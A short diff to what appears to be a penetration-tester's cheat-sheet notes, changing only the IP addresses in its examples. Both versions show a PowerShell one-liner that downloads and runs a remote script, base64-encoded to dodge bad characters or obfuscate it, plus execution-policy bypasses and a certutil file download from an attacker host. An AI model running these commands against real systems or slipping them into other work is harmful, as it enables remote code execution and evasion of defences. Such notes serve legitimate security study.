@@ -28,7 +28,7 @@ base64 encoding a file upload to avoid badchars or to obfuscate.
 Example:
 
 in linux:
-$ echo "powershell.exe -c 'IEX(IWR http://10.10.10.10/file.ps1 -UseBasicParsing)'" | iconv -f ASCII -t UTF-16LE | base64 | tr -d "\n"
+$ echo "powershell.exe -c 'IEX(IWR http://192.168.1.1/file.ps1 -UseBasicParsing)'" | iconv -f ASCII -t UTF-16LE | base64 | tr -d "\n"
 result = a base64 blob.
 
 Then run on attacker machine:
@@ -46,5 +46,5 @@ $ Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
 $ Set-ExecutionPolicy Unrestricted
 
 Or avoid this protection for 1 command:
-$ powershell.exe -exec bypass -Command "& {certutil.exe -urlcache -f http://192.168.1.1:80/file.txt}"
+$ powershell.exe -exec bypass -Command "& {certutil.exe -urlcache -f http://192.168.119.1:80/file.txt}"
 ```
